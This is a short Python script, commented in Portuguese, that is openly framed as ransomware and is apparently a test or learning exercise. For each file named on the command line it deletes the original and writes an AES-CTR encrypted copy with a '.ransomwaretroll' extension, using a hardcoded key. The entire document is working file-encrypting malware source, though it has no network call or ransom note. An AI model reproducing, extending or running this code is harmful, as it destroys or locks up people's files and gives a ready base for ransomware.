import os
import pyaes
import sys

def criptografar_arquivo(file_name, key):
    try:
        # Abrir o arquivo de forma segura
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)
    except FileNotFoundError:
        print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
        return
    except PermissionError:
        print(f"Erro: Permissão insuficiente para acessar '{file_name}'.")
        return

    # Criptografar os dados do arquivo
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file_name = f"{file_name}.ransomwaretroll"
    try:
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)
    except PermissionError:
        print(f"Erro: Não foi possível salvar o arquivo '{new_file_name}'.")

def main():
    # Verificar se pelo menos um arquivo foi passado como argumento
    if len(sys.argv) < 2:
        print("Uso: python encrypt.py <arquivo1> <arquivo2> ... <arquivoN>")
        exit(1)

    # Chave de criptografia (deve ter 16, 24 ou 32 bytes para AES)
    key = b"testeransomwares"  # Certifique-se de usar uma chave forte e segura

    # Criptografar cada arquivo passado como argumento
    for file_name in sys.argv[1:]:
        criptografar_arquivo(file_name, key)

if __name__ == "__main__":
    main()

